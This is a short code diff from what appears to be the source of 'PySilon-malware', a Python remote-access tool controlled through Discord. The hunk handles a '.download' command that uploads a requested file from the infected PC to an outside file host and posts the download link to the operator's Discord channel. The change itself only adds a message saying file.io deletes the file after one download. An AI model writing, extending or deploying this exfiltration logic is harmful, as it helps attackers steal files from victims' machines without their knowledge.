@@ -48,7 +48,8 @@ elif message.content[:9] == '.download':
                 embed = discord.Embed(title=f"🟢 {message.content[10:]}",description=f"Click [here](<{data['link']}>) to download.", colour=discord.Colour.green())
                 embed.set_author(name="PySilon-malware", icon_url="https://cdn.discordapp.com/attachments/1125126897584574476/1134166476560011386/icon-1.png")
                 await message.channel.send(embed=embed)
-                #.log Sent Anonfiles link to uploaded file 
+                #.log Sent Anonfiles link to uploaded file
+                await message.channel.send('Warning: The file will be removed from file.io right after the first download.')
             else:
                 #.log File requested by Author does not exist on this PC 
                 embed = discord.Embed(title="📛 Error",description=f'```❗ File or directory not found.```', colour=discord.Colour.red())
